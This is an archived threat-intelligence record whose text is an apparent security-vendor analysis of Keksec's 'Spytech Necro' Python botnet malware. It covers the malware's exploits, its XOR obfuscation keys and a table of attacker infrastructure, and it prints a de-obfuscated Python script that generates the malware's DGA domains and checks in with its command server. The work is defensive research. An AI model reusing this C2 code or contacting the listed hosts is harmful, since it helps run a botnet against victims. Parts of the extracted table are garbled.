{
    "id": "a576804e-bb06-45de-8af6-ff8c0d6920ad",
    "created_at": "2023-01-12T14:59:28.825397Z",
    "updated_at": "2025-03-27T02:10:04.364749Z",
    "deleted_at": null,
    "sha1_hash": "582b60fd7ae8ff3afc72f5c46d7aa73cc5482e6c",
    "title": "2021-10-13 - ‚ÄúSpytech Necro‚Äù ‚Äì Keksec‚Äôs Latest Python Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T05:01:36Z",
    "file_modification_date": "2022-05-28T05:01:36Z",
    "file_size": 465818,
    "plain_text": "# ‚ÄúSpytech Necro‚Äù ‚Äì Keksec‚Äôs Latest Python Malware\n\n**lacework.com/blog/spytech-necro-keksecs-latest-python-malware/**\n\n**Key Takeaways**\n\n\nOctober 14, 2021\n\n\nKeksec (aka Freakout) continues to develop Necro ‚Äì their polymorphic python-based IRC malware\nThe newest version dubbed ‚ÄúSpytech Necro‚Äù includes significant updates to the C2 protocol and additional exploits\nincluding the recent Confluence exploit described in CVE-2021-26084\nKeksec is distributing additional Tsunami malware via their ‚ÄúSamael‚Äù botnet infrastructure\n[Analysis tools and indicators are available here](https://github.com/lacework/lacework-labs/tree/master/keksec)\n\nBeginning in mid-September new Necro variants started appearing on VirusTotal. Analysis of these specimens revealed\nconfigurations including previously unobserved exploits and capabilities. While activity in the wild appears limited at this\ntime, this does indicate continued development of the Necro python malware. These new specimens coincided with\ninfrastructure staging belonging to the Keksec‚Äôs ‚ÄúSamael‚Äù botnet. Additionally, infrastructure leveraged by Keksec is\nlikewise being leveraged by other actors including those responsible for the SBIDIOT botnet and known IoT attacker\nDaddyL33t.\n\n**Spytech Necro**\n\nIn a deviation from previous Necro versions, ‚ÄúSpytech Necro‚Äù uses a plaintext XOR key of\n\\x65hhhhFuckSpyTechUsersWeDaMilitiaAnonym00se, as opposed to an integer array. This is used in combination zlib\ncompression to obfuscate important strings in the malware. These new versions can be decoded with a script provided by\nLacework Labs. Other key updates include exploits for:\n\nCVE-2014-6271 ‚Äì Shellshock\n[Drupal RCE (< 8.6.10 / < 8.5.11 ‚Äì REST Module Remote Code Execution)](https://www.exploit-db.com/exploits/46452)\nCVE-2021-26084 ‚Äì Confluence Server Webwork OGNL injection\n[Jenkins RCE (CVE-2019-1003029, CVE-2019-1003030](https://github.com/gquere/pwn_jenkins/blob/master/README.md)\n\nThe most significant modification in Spytech Necro involves the C2 protocol, specifically with a C2 check-in and fetching\nof configurations. A new DGA schema that leveraged NoIP free domains was also observed however this functionality is\nfrequently updated among various Necro versions. Similar to the Necro obfuscation itself, the C2 protocol also uses a\nmultibyte XOR in combination with Zlib, albeit with a separate key ‚Äì n3cr0t0r_freakout. Following the check-in, the C2\nreturns the following data:\n\nChannel name\nChannel password‚Äô\nSHA512 password hash for bot authentication\nCommand prefix\nIRC host\n\nAt the time of this blog, the configured IRC host is 66.29.149.202 (Namecheap) and the channel is #dankmemez. The\nfollowing python is a de-obfuscated and commented version of the Necro C2 component and will return the current\nconfiguration (assuming the infrastructure is online):\n\n\n-----\n\n```\n# -*- coding: utf-8 -*import socket\nimport random\nimport struct\nimport zlib\nimport time\n#XOR c2 config with n3cr0t0r_freakout\ndef xor_config(word):\n  return ''.join([chr(ord(v) ^ ord(\"n3cr0t0r_freakout\"[i % 17])) for i, v in enumerate(word)])\nnoip =\n[\"ddns.net\",\"ddnsking.com\",\"3utilities.com\",\"bounceme.net\",\"freedynamicdns.net\",\"freedynamicdns.org\",\"gotdns.ch\",\"hopto.org\",\"myddns.me\",\"myf\ncounter_=0\nt1= 0\n#enumerate DGA\nwhile 1:\n  t1 += 1\n  if counter_&amp;gt;=0xFD:#break @ 253 domains\n    break\n  counter_+=1\n  random.seed(a=0xFAFFDED00001 + counter_)#generate seed for DGA (python 2 only)\n  c2domain =(''.join(random.choice(\"abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\") for _ in\nrange(random.randrange(10,19)))).lower()+\".\"+random.choice(noip)\n  print c2domain\n  try:\n    #c2 checkin###############\n    c2=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n    c2.sendto('\\x1b'+47 * '\\0',(\"time.google.com\",123))\n    msg,c2response=c2.recvfrom(1024)\n    t=struct.unpack(\"!12I\",msg)[10] - 2208988800\n    str_=lambda x : ''.join([str((x >> i) & 1) for i in range(32)])\n    c2connect=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    c2connect.connect((c2domain, 0xCD56))\n    c2connect.send(''.join([chr(random.randint(0,128)) if x == \"0\" else chr(random.randint(128,255)) for x in str_(t)]))\n    ###########################\n    #recv config###############    \n    c2rec2=c2connect.recv(32)\n    msg_part5=ord(c2rec2[-5])\n    msg_part4=ord(c2rec2[-4])\n    msg_part3=ord(c2rec2[-3])\n    msg_part2=ord(c2rec2[-2])\n    msg_part1=ord(c2rec2[-1])\n    ###########################\n    #fetch config##############\n    channel=zlib.decompress(xor_config(c2connect.recv(msg_part5)))\n    print 'channel:',channel\n    channel_password=zlib.decompress(xor_config(c2connect.recv(msg_part4)))\n    print 'channel_password:',channel_password\n    bot_password_hash=zlib.decompress(xor_config(c2connect.recv(msg_part3)))\n    print 'bot_password_hash:',bot_password_hash\n    cmdprefix=zlib.decompress(xor_config(c2connect.recv(msg_part2)))\n    print 'cmdprefix:',cmdprefix\n    irc_host=zlib.decompress(xor_config(c2connect.recv(msg_part1)))\n    print 'irc_host:',irc_host\n    c2connect.close()\n    ###########################\n  except Exception as e:\n    raise\n  time.sleep(10)\n\n```\n\n-----\n\n```\n       p y g p g\ninteresting feature as it adds an additional layer of operational security. This means even if someone has most\nof the C2 configurations, they would not be able to issue commands to the Necro bots without the correct prefix.\n\n```\n_Figure 1 command prefix validation_\n\n**Samael**\n\nKeksec infrastructure is characterized by its various botnets. While several are currently active, the most recent of these\nappears to be the ‚ÄúSamael‚Äù component. Samael has been active since at least late June 2021.\n\n_Figure 2- Samael & Urmom_\n\n\n-----\n\n[Malware download from Samael hosts is similar to the Tsunami Ryuk malware reported by Lacework Labs in July 2021.](https://www.lacework.com/blog/keksec-tsunami-ryuk/)\nThe distinguishing feature being the log file written to the victim machine. In this case the log file is plaintext with the\nmessage: This device has been infected by urmommy üòä. The ‚ÄòUrmommy‚Äô handle was also seen in a screenshot from the\nhellabooters Instagram, also reported in the Tsunami-Ryuk blog. (Figure 2)\n\nFigure 3- Samael & Urmommy artifacts\n\nExamination of Samael infrastructure revealed overlaps with other botnets, including those belonging to Keksec, as well\nas those with no known Keksec association such as the SBIDIOT botnet. SBIDIOT is a prolific IoT botnet that was first\n[reported in April 2021 by Nozomi Networks. Another overlap of note was between Keksec and known IoT actor](https://www.nozominetworks.com/blog/threat-intelligence-analysis-of-the-sbidiot-iot-malware/)\n‚ÄúDaddyL33t.‚Äù This link is also reflected in the Instagram where the Keksec profile ur0a_ has links to the alleged Instagram\nprofile for DaddyL33t (1m4osec). The following table lists known Samael hosts, most of which are either hosted at\nColocrossing or Nexeon:\n\n\nHost First\nSeen\n\n\nLast Seen ASN Country specimens Botnet(s)\n\n\n23.94.26.138 9/16/2021 10/11/2021 36352:‚ÄùASCOLOCROSSING‚Äù\n\n179.43.149.13 8/12/2021 10/10/2021 51852:‚ÄùPrivate\nLayer INC‚Äù\n\n\nUnited\nStates\n\n\n180 SBIDIOT,Samael,DaddyL33t\n\n\nSwitzerland 40 SBIDIOT,Simps,Samael\n\n\n104.237.202.22 9/25/2021 9/25/2021 20278:‚ÄùNEXEON‚Äù United\nStates\n\n167.88.12.77 8/9/2021 8/10/2021 20278:‚ÄùNEXEON‚Äù United\nStates\n\n\n104.168.102.120 8/9/2021 8/9/2021 36352:‚ÄùASCOLOCROSSING‚Äù\n\n107.175.94.101 7/16/2021 8/5/2021 36352:‚ÄùASCOLOCROSSING‚Äù\n\n198.46.202.103 7/3/2021 8/2/2021 36352:‚ÄùASCOLOCROSSING‚Äù\n\n\nUnited\nStates\n\nUnited\nStates\n\nUnited\nStates\n\n\n172.93.129.227 7/8/2021 7/15/2021 20278:‚ÄùNEXEON‚Äù United\nStates\n\n\n107.172.197.193 7/7/2021 7/7/2021 36352:‚ÄùASCOLOCROSSING‚Äù\n\n\nUnited\nStates\n\n\n1 Samael\n\n3 Samael\n\n1 Samael\n\n27 Samael,batkek\n\n63 Samael,Simps\n\n11 Samael\n\n10 Samael\n\n\nSpytech Necro appears to have limited distribution at this time and there are no indications of widespread deployment.\nThis presumption is based on the absence of Necro scanning artifacts in Lacework Labs honeypots, as well as no\nobserved check-ins to the Spytech Necro IRC server. The malware‚Äôs new abilities allow for dynamic bot updates and\nbetter resiliency so this new functionality will likely make its way into follow-on versions.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-13 - ‚ÄúSpytech Necro‚Äù ‚Äì Keksec‚Äôs Latest Python Malware.pdf"
    ],
    "report_names": [
        "2021-10-13 - ‚ÄúSpytech Necro‚Äù ‚Äì Keksec‚Äôs Latest Python Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "5a270f6c-2c13-4abf-861e-7d44dcfa5ceb",
            "created_at": "2023-11-03T02:00:07.794425Z",
            "updated_at": "2025-03-27T02:00:03.146871Z",
            "deleted_at": null,
            "main_name": "Keksec",
            "aliases": [],
            "source_name": "MISPGALAXY:Keksec",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535568,
    "ts_updated_at": 1743041404,
    "ts_creation_date": 1653714096,
    "ts_modification_date": 1653714096,
    "files": {
        "pdf": "https://archive.orkl.eu/582b60fd7ae8ff3afc72f5c46d7aa73cc5482e6c.pdf",
        "text": "https://archive.orkl.eu/582b60fd7ae8ff3afc72f5c46d7aa73cc5482e6c.txt",
        "img": "https://archive.orkl.eu/582b60fd7ae8ff3afc72f5c46d7aa73cc5482e6c.jpg"
    }
}